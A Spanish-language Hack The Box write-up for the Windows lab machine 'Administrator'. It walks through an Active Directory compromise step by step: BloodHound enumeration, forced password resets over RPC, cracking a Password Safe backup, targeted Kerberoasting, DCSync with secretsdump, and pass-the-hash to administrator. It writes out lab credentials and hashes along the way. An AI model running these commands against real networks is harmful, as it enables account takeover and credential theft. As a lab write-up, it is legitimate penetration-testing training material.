# Máquina Administrator

Enlace a la máquina -> [HackTheBox](https://app.hackthebox.com/machines/Administrator)

![imagen](https://github.com/user-attachments/assets/241cde4a-5d89-4d35-a6dd-978c9c7ea025)

- **Nombre de la Máquina:** Administrator  
- **Sistema Operativo:** Windows  
- **Dificultad:** Medio  
- **Plataforma:** Hack The Box  
- **Dirección IP:** 10.10.11.42 
- **Skills**
  - Nmap Scanning
  - WinRM Enumeration and Exploitation
  - Password Cracking with John the Ripper
  - Kerberoasting Attack
  - Active Directory Enumeration
  - BloodHound Analysis
  - Privilege Escalation via User Permissions
  - Password Dumping with impacket-secretsdump
  - FTP Enumeration
  - Password Safe Decryption
  - Pass The Hash Attack

## Reconocimiento y Enumeración

Comenzamos realizando un escaneo general utilizando Nmap para identificar los puertos abiertos y sus versiones en la IP del objetivo:

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn -sCV 10.10.11.42 -oN escaneo.txt
```

Por el escaneo vemos que es un común Windows server. En la descripción de la máquina pone lo siguiente:

![imagen](https://github.com/user-attachments/assets/ae944972-c2d9-4524-ae3d-4bae2ec86b25)

Quiere decir que como es habitual en los pentests de Windows de la vida real, iniciará el cuadro de Administrador con las credenciales de la siguiente cuenta: Nombre de usuario: Olivia Contraseña: ichliebedich.

### WinRM - 5985

Probaremos a usar 'netexec' para comprobar si tenemos control remoto del usuario.

```bash
nxc winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich'
```

![imagen](https://github.com/user-attachments/assets/51176189-79d2-4d55-9e6d-a218a49f5d66)

Tenemos el mensaje de pwn3d! por lo cual tenemos ejecución remota de comando con WinRm, accederemos con **evil-winrm**.

```bash
evil-winrm -i 10.10.11.42 -u 'olivia' -p 'ichliebedich'
```

![imagen](https://github.com/user-attachments/assets/15a3d8bf-65a4-4c50-9371-537ee5497c12)

Enumerando el sistema me encuentro con que existe otro usuario llamado **emily**, pero no me quedo conforme, vamos a enumerar con 'netexec' todos los usuarios posibles.

```bash
nxc smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --rid-brute
```

![imagen](https://github.com/user-attachments/assets/60a720c8-a281-4d44-9ff2-f5ec402e830c)

Pues ahí tenemos una lista grande de usuarios disponibles, pero al intentar un ataque **AS-REPRoasting** no sacamos nada relevante. Seguiremos enumerando pero usando bloodhound.

Subiremos un archivo llamado **SharpHound.exe** vía winrm y lo ejecutamos.

```bash
upload /home/kali/Desktop/HackTheBox/SharpHound.exe
.\SharpHound.exe -c all
```

![imagen](https://github.com/user-attachments/assets/80f4fd3c-f40f-4807-b39f-0336ca6c8cb9)

Una vez terminado descargamos el **.zip** en nuestra máquina kali y lo cargamos en bloodhound.

```bash
download 20241217142202_BloodHound.zip
sudo neo4j console &>/dev/null & disown
bloodhound -no-sandbox &>/dev/null & disown
```

![imagen](https://github.com/user-attachments/assets/5ea14435-054d-4079-836d-d85c422d14c6)

Seleccionamos el usuario con el cuál tenemos acceso principalmente y comenzamos a enumerar.

![imagen](https://github.com/user-attachments/assets/ea455925-2e93-44a4-bfa5-5ebddd374d3e)

Pues he encontrado una sección en la que me dice que el usuario **olivia** tiene control total sobre el usuario michael, por lo cuál podriamos cambiarle la contraseña y acceder a su usuario.

![imagen](https://github.com/user-attachments/assets/1442d4b9-9a97-4904-bf22-6e1620e24c3e)

![imagen](https://github.com/user-attachments/assets/250130d4-4333-428b-b4f0-6f5d342ad65d)

Podemos hacerlo vía kali linux como explica en bloodhount.

![imagen](https://github.com/user-attachments/assets/558376e1-d8c8-4115-a39c-67ce7ded3188)

```bash
net rpc password "michael" 'Password123!' -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.10.11.42"
```

Como podemos observar, hemos cambiado la contraseña del usuario michael y lo comprobamos con netexec.

```bash
nxc smb 10.10.11.42 -u 'michael' -p 'Password123!'
nxc winrm 10.10.11.42 -u 'michael' -p 'Password123!'
```

![imagen](https://github.com/user-attachments/assets/6cf47e1b-99af-41d4-a9b7-188ae16f7102)

![imagen](https://github.com/user-attachments/assets/ea814f7f-c6d3-4855-b29a-afaa3bda1e30)

Accedí via winrm pero no encontré nada interesante.

![imagen](https://github.com/user-attachments/assets/45ae3131-9291-4f11-8583-903e1597cb52)

Volvemos a bloodhound y buscaremos vectores de ataque pero desde el usuario **michael**.

![imagen](https://github.com/user-attachments/assets/2e1831b5-e8f6-45ef-ad07-6ae357fa5a75)

Pues podemos forzar a cambiar la contraseña al usuario **Benjamin**.

![imagen](https://github.com/user-attachments/assets/f873142a-7b21-47f2-86aa-d6f91102e60e)

Podemos hacerlo de la misma manera que con **michael**, vía rpc.

```bash
net rpc password "benjamin" 'Password123!' -U "administrator.htb"/"michael"%'Password123!' -S "10.10.11.42"
```

Ya habremos cambiado la contraseña pero no podía acceder vía winrm y me quedé atascado, volví a leer el escaneo de nmap y me dí cuenta de que el puerto ftp está abierto y probé con las credenciales de **benjamin** y pude acceder al puerto FTP.

```bash
nxc ftp 10.10.11.42 -u 'benjamin' -p 'Password123!'
```

![imagen](https://github.com/user-attachments/assets/dc3bea54-d3ae-4bd6-bc1a-a4da62423353)

```bash
ftp benjamin@10.10.11.42
get Backup.psafe3
```

![imagen](https://github.com/user-attachments/assets/01216380-7661-408a-aa2c-535c8eb86fae)

Vemos un archivo con extensión **.psafe3**, investigando por google al parecer es un archivo de un gestor de contraseñas, el cuál podremos crackear usando **john the ripper**.

```bash
pwsafe2john Backup.psafe3 > backup_hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash
```

![imagen](https://github.com/user-attachments/assets/d30f407f-9209-40e5-867e-5a7065ec66fe)

Abriremos el gestor de contraseñas y veremos a más usuarios con sus credenciales.

![imagen](https://github.com/user-attachments/assets/d92ced5f-3e30-4588-8461-d48347c794d6)

![imagen](https://github.com/user-attachments/assets/5cf8f158-3c1b-4cee-a864-07617d2422a6)

![imagen](https://github.com/user-attachments/assets/93b472f3-ab95-4104-8ae4-300d2061fbc8)

Accediendo vía winrm encontramos la flag **user.txt** dentro del usuario **emily**.

![imagen](https://github.com/user-attachments/assets/e5456aec-5a07-43dc-a0d8-f02dfa100373)

Enumeramos por bloodhound y vemos lo siguiente.

![imagen](https://github.com/user-attachments/assets/5e6bf503-a7f1-4a25-aad9-69eb2818e0f5)

# Explotación

---

### Kerberoasting attack

La herramienta intentará automáticamente un ataque de Kerberoast dirigido, ya sea contra todos los usuarios o contra uno específico, si se especifica en la línea de comandos, y luego obtendrá un hash que se puede crackear. También se realiza la limpieza automáticamente.

El hash recuperado puede crackearse sin conexión usando la herramienta que **john**.

![imagen](https://github.com/user-attachments/assets/4d6d2f66-771f-4e72-a937-3f9708099dde)

```bash
sudo ntpdate administrator.htb
python3 targetedKerberoast.py -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -v
```

![imagen](https://github.com/user-attachments/assets/5490cb7e-f8d7-4b7e-8b15-92f4fa163890)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash
```

![imagen](https://github.com/user-attachments/assets/9c443aca-c0f1-4fae-b3f9-c09cc7fb3816)

Tenemos la password de **ethan**, y si vemos otra vez bloodhound, vemos que podemos hacer un ataque **DCSync**.

![imagen](https://github.com/user-attachments/assets/be169341-34fa-430c-a11a-18af6b15f70d)

Podremos sacar los hashes de los usuarios usando la herramienta de impacket **secretdump**.

![imagen](https://github.com/user-attachments/assets/bb4cad9c-3751-44e4-a791-a30099dc06cb)

```bash
impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.10.11.42
```

![imagen](https://github.com/user-attachments/assets/94f7bd95-8584-4bef-bf96-61ae8b8dff07)

# Escalada de privilegios

---

Haremos un **pass the hash** con el usuario administrador para comprobar si tenemos acceso.

```bash
nxc winrm 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

![imagen](https://github.com/user-attachments/assets/1e1a31ea-2ea8-454e-88f8-157730d68e11)

Podemos acceder al usuario **Administrator**.

```bash
evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

![imagen](https://github.com/user-attachments/assets/5c397941-0240-4c7f-bb25-997f656a72a4)

¡Máquina vulnerada al completo!
